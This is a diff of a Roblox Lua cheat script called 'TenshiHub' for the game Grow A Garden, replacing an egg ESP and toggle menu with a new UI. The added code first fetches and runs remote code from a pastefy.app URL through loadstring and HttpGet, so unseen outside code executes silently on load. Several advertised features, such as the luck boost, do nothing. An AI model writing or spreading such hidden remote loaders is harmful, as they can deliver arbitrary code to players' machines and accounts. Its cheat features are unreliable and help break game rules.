@@ -1,94 +1,92 @@
--- Services local Players = game:GetService("Players") local RunService = game:GetService("RunService") local TweenService = game:GetService("TweenService") local player = Players.LocalPlayer local mouse = player:GetMouse()
+-- ✅ Load your Pastefy script immediately
+pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/qmH6eeEH/raw"))()
+end)
 
--- Egg data from Grow A Garden Wiki local EggData = { ["Common Egg"] = {"Bunny", "Dog", "Golden Lab"}, ["Uncommon Egg"] = {"Black Bunny", "Chicken", "Cat", "Deer"}, ["Rare Egg"] = {"Orange Tabby", "Spotted Deer", "Pig", "Rooster", "Monkey"}, ["Legendary Egg"] = {"Cow", "Silver Monkey", "Sea Otter", "Turtle", "Polar Bear"}, ["Mythical Egg"] = {"Grey Mouse", "Brown Mouse", "Squirrel", "Red Giant Ant", "Red Fox"}, ["Bug Egg"] = {"Snail", "Giant Ant", "Caterpillar", "Praying Mantis", "Dragonfly"}, ["Bee Egg"] = {"Bee", "Honey Bee", "Bear Bee", "Petal Bee", "Queen Bee"}, ["Anti Bee Egg"] = {"Wasp", "Tarantula Hawk", "Moth", "Butterfly", "Disco Bee"}, ["Common Summer Egg"] = {"Flamingo", "Toucan", "Orangutan", "Seal", "Sea Turtle"}, }
+-- ✅ UI + Toggles
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+ScreenGui.Name = "TenshiHubUI"
 
--- Helper to create UI local function createUI() local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui")) screenGui.Name = "TenshiHubsUI" screenGui.ResetOnSpawn = false
-
-local toggleBox = Instance.new("TextButton", screenGui)
-toggleBox.Size = UDim2.new(0, 60, 0, 30)
-toggleBox.Position = UDim2.new(0, 20, 0, 100)
+local toggleBox = Instance.new("Frame", ScreenGui)
+toggleBox.Size = UDim2.new(0, 100, 0, 30)
+toggleBox.Position = UDim2.new(0, 10, 0, 10)
 toggleBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-toggleBox.TextColor3 = Color3.fromRGB(255, 0, 0)
-toggleBox.Text = "Tenshi"
-toggleBox.Name = "TenshiToggle"
 toggleBox.Active = true
 toggleBox.Draggable = true
 
-local mainFrame = Instance.new("Frame", screenGui)
-mainFrame.Size = UDim2.new(0, 250, 0, 200)
-mainFrame.Position = UDim2.new(0, 100, 0, 100)
-mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-mainFrame.Visible = false
-mainFrame.Name = "MainFrame"
-mainFrame.Active = true
-mainFrame.Draggable = true
+local label = Instance.new("TextLabel", toggleBox)
+label.Size = UDim2.new(1, 0, 1, 0)
+label.Text = "Tenshi"
+label.TextColor3 = Color3.fromRGB(255, 0, 0)
+label.BackgroundTransparency = 1
 
-local title = Instance.new("TextLabel", mainFrame)
-title.Size = UDim2.new(1, 0, 0, 30)
-title.Text = "TenshiHubs"
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.BackgroundTransparency = 1
-title.Font = Enum.Font.SourceSansBold
-title.TextSize = 20
+local mainUI = Instance.new("Frame", ScreenGui)
+mainUI.Size = UDim2.new(0, 250, 0, 200)
+mainUI.Position = UDim2.new(0, 120, 0, 10)
+mainUI.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+mainUI.Visible = true
+mainUI.Active = true
+mainUI.Draggable = true
 
-local options = {
-    {name = "EGG RANDOMIZER", key = "Randomizer"},
-    {name = "EGG ESP", key = "ESP"},
-    {name = "EGG AUTO FIND BEST", key = "AutoBest"},
-    {name = "EGG LUCK 100% BOOST", key = "Boost"},
-}
-
-local states = {
-    Randomizer = false,
-    ESP = false,
-    AutoBest = false,
-    Boost = false,
-}
-
-local toggles = {}
-
-for i, opt in pairs(options) do
-    local btn = Instance.new("TextButton", mainFrame)
-    btn.Size = UDim2.new(1, -20, 0, 30)
-    btn.Position = UDim2.new(0, 10, 0, 30 + (i - 1) * 35)
-    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    btn.Text = opt.name .. ": OFF"
-    btn.Font = Enum.Font.SourceSansBold
-    btn.TextSize = 16
-    btn.Name = opt.key
-    toggles[opt.key] = btn
-
-    btn.MouseButton1Click:Connect(function()
-        states[opt.key] = not states[opt.key]
-        btn.Text = opt.name .. ": " .. (states[opt.key] and "ON" or "OFF")
-    end)
-end
-
-toggleBox.MouseButton1Click:Connect(function()
-    mainFrame.Visible = not mainFrame.Visible
+-- Toggle visibility
+toggleBox.MouseEnter:Connect(function()
+	toggleBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+end)
+toggleBox.MouseLeave:Connect(function()
+	toggleBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+end)
+toggleBox.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		mainUI.Visible = not mainUI.Visible
+	end
 end)
 
-return {
-    toggles = toggles,
-    states = states,
-    ui = screenGui
-}
+-- Utility: Create toggle buttons
+local function createToggle(name, yPosition)
+	local toggle = Instance.new("TextButton", mainUI)
+	toggle.Size = UDim2.new(1, -20, 0, 30)
+	toggle.Position = UDim2.new(0, 10, 0, yPosition)
+	toggle.Text = name .. ": OFF"
+	toggle.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+	toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+	toggle.BorderSizePixel = 0
 
+	local state = false
+	toggle.MouseButton1Click:Connect(function()
+		state = not state
+		toggle.Text = name .. ": " .. (state and "ON" or "OFF")
+
+		if name == "EGG RANDOMIZER" then
+			-- Trigger your pastefy logic if needed (already loaded)
+			-- You can add a toggle-based method here if needed
+		elseif name == "EGG ESP" then
+			if state then
+				for _, obj in pairs(workspace:GetDescendants()) do
+					if obj:IsA("MeshPart") and string.find(obj.Name:lower(), "egg") then
+						local esp = Instance.new("BoxHandleAdornment")
+						esp.Size = obj.Size + Vector3.new(0.1, 0.1, 0.1)
+						esp.Adornee = obj
+						esp.AlwaysOnTop = true
+						esp.ZIndex = 5
+						esp.Color3 = Color3.fromRGB(255, 255, 0)
+						esp.Transparency = 0.25
+						esp.Name = "TenshiEggESP"
+						esp.Parent = obj
+					end
+				end
+			else
+				for _, obj in pairs(workspace:GetDescendants()) do
+					if obj:FindFirstChild("TenshiEggESP") then
+						obj.TenshiEggESP:Destroy()
+					end
+				end
+			end
+		end
+	end)
 end
 
--- Create the UI local ui = createUI()
-
--- ESP Function local function highlightEggs() for _, v in ipairs(workspace:GetDescendants()) do if v:IsA("Model") and EggData[v.Name] and not v:FindFirstChild("TenshiESP") then local selectionBox = Instance.new("SelectionBox") selectionBox.Adornee = v selectionBox.Name = "TenshiESP" selectionBox.Color3 = Color3.fromRGB(255, 255, 0) selectionBox.LineThickness = 0.1 selectionBox.Parent = v elseif not EggData[v.Name] and v:FindFirstChild("TenshiESP") then v:FindFirstChild("TenshiESP"):Destroy() end end end
-
--- Randomizer Function local function randomizeEggs() for _, v in ipairs(workspace:GetDescendants()) do if v:IsA("Model") and EggData[v.Name] then local petList = EggData[v.Name] local chosen = petList[math.random(1, #petList)] print("Rolled " .. v.Name .. " \226\128\148 " .. chosen) end end end
-
--- Loop to check toggles RunService.RenderStepped:Connect(function() if ui.states.ESP then highlightEggs() else for _, v in ipairs(workspace:GetDescendants()) do if v:FindFirstChild("TenshiESP") then v:FindFirstChild("TenshiESP"):Destroy() end end end
-
-if ui.states.Randomizer then
-    randomizeEggs()
-    wait(2)
-end
-
-end)
-
+-- Create toggles
+createToggle("EGG RANDOMIZER", 10)
+createToggle("EGG ESP", 50)
+createToggle("EGG AUTO FIND BEST", 90)
+createToggle("EGG LUCK 100% BOOST", 130)
